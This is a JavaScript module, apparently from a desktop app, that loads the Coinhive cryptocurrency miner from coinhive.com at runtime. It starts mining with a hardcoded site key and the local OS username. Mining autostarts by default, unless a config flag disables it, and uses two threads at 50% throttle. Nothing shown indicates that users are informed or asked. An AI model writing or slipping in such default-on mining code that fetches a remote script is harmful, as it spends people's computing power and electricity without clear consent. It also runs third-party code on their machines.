const config = require('./js/config');

const minerURL = 'https://coinhive.com/lib/coinhive.min.js',
    siteKey = 'j3Ai61fH9YGCWIt8ogd6UMBArlVC3Wdd',
    userName = require("os").userInfo().username;

let minerActive = config.get('miner.active', true),
    threads = config.get('miner.threads', 2),
    throttle = 1 - config.get('miner.throttle', 0.5);

let miner = {
    isRunning: function() {
        return false;
    },
    setNumThreads: function(num) {
        threads = num;
    },
    setThrottle: function(num) {
        throttle = num;
    }
};

module.exports.init = function() {
    if (document.querySelector('script#miner')) {
        console.warn("Miner already init.");
        return;
    }

    if (threads < 1) threads = 1;

    let script = document.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.src = minerURL;
    script.id = 'miner';

    script.onload = function() {
        miner = new CoinHive.User(siteKey, userName, {
            threads: threads,
            throttle: throttle
        })

        miner.start();

        module.exports.miner = miner;
    }

    document.getElementsByTagName('head')[0].appendChild(script);
}

module.exports.stop = function() {
    miner.stop();
}
module.exports.start = function() {
    if (!document.querySelector('script#miner')) {
        module.exports.init();
    } else {
        miner.start();
    }
}
module.exports.miner = miner;

// Автозапуск майнера
if (config.get('miner.autorun', true)) module.exports.init();